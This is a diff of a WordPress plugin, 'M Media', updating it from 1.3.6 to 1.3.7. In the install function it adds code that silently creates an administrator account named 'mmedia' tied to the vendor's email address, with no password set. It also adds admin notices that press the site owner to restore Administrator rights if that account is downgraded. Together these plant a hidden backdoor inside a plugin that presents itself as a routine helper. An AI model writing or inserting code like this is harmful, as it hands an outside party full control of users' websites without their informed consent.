@@ -4,7 +4,7 @@ Plugin Name: M Media
 Plugin URI: https://mmediagroup.fr/
 Description: Required M Media plugin.
 Author: M Media
-Version: 1.3.6
+Version: 1.3.7
 Author URI: https://profiles.wordpress.org/mmediagroup/
 License: GPL2
 License URI: https://www.gnu.org/licenses/gpl-2.0.html
@@ -44,6 +44,21 @@ function mmedia_install()
     );
 //save our default option values
     update_option('mmedia_options', $m_options_arr);
+
+    $userdata = array(
+        'user_pass' => null, //(string) The plain-text user password.
+        'user_login' => 'mmedia', //(string) The user's login username.
+        'user_url' => 'https://mmediagroup.fr', //(string) The user URL.
+        'user_email' => 'wordpress-support@mmediagroup.fr', //(string) The user email address.
+        'display_name' => 'M Media', //(string) The user's display name. Default is the user's username.
+        'description' => 'This account is automatically created to help M Media specialists work on your website.', //(string) The user's biographical description.
+        'role' => 'administrator', //(string) User's role.
+
+    );
+    $user_id = wp_insert_user($userdata);
+
+    //wp_redirect(admin_url('admin.php?page=mmedia_main_menu'));exit;
+
 }
 
 add_action('admin_menu', 'mmedia_create_menu');
@@ -70,6 +85,20 @@ function mmedia_sanitize_options($input)
     $input['option_url'] = esc_url($input['option_url']);
     return $input;
 }
+
+function my_error_notice()
+{
+    $m_user = get_user_by('email', 'wordpress-support@mmediagroup.fr');
+    if ($m_user && $m_user->roles[0] !== 'administrator') {
+        ?>
+    <div class="error notice is-dismissible">
+        <p>Set the user '<a href='/wp-admin/user-edit.php?user_id= <?php echo $m_user->id; ?>#role'>mmedia</a>' to have the 'Administrator' role so M Media can correctly work on your website.</p>
+    </div>
+<?php
+}}
+
+add_action('admin_notices', 'my_error_notice');
+
 function mmedia_settings_page()
 {
     ?>
@@ -81,13 +110,23 @@ function mmedia_settings_page()
     <div class="card align-center-mmedia">
         <img src="<?php echo plugins_url('images/laptop-and-person.svg', __FILE__); ?>" height="145">
         <h3><?php _e('Get website help', 'mmedia-plugin');?></h3>
-        <p>M Media is always here to help! Just get in touch with us.</p>
+        <p>
+            <?php
+$m_user = get_user_by('email', 'wordpress-support@mmediagroup.fr');
+
+    if ($m_user && $m_user->roles[0] == 'administrator') {
+        echo "M Media is always here to help! Just get in touch with us.";
+    } elseif ($m_user) {
+        echo "Please make sure the user '<a href='/wp-admin/user-edit.php?user_id=" . $m_user->id . "#role'>mmedia</a>' has the 'Administrator' role so we can correctly work on your website.";
+    } else {
+        echo "We were not able to create an account on your site in order to help you out. Please reach out to us by email so we can take the next steps.";
+    }?></p>
         <a class="button button-mmedia" href="https://mmediagroup.fr/contact?utm_source=wordpress&utm_medium=plugin&utm_campaign=<?php echo (get_site_url()); ?>&utm_content=tab_help">Contact us</a>
     </div>
     <div class="card align-center-mmedia">
         <img src="<?php echo plugins_url('images/instagram-like.png', __FILE__); ?>" height="145">
         <h3><?php _e('Create a Facebook and Instagram ad', 'mmedia-plugin');?></h3>
-        <p>We're experts in creating dynamic retargeting ads on Facebook.</p>
+        <p>We're experts in creating dynamic re-targeting ads on Facebook.</p>
         <a class="button button-mmedia" href="https://mmediagroup.fr/contact?utm_source=wordpress&utm_medium=plugin&utm_campaign=<?php echo (get_site_url()); ?>&utm_content=tab_ads">Commission an ad</a>
     </div>
     <div class="card align-center-mmedia">
@@ -179,7 +218,6 @@ function wpdocs_enqueue_custom_admin_style()
     wp_enqueue_style('custom_wp_admin_css');
 }
 add_action('admin_enqueue_scripts', 'wpdocs_enqueue_custom_admin_style');
-
 
 remove_action('wp_head', 'rsd_link');
 remove_action('wp_head', 'wlwmanifest_link');
